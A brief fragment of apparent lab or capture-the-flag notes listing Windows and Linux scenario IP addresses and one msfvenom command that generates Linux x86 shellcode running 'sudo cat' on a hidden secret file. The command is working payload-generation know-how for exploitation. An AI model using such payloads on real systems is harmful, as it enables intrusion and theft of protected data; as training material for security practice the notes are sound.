Windows Scenario | 10.18.0.1 | 10.50.45.45
Linux Scenario | 10.18.0.2 | 10.50.22.16

msfvenom -p linux/x86/exec CMD="sudo cat /.secret/.verysecret.pdb" -b '\x00' -f python
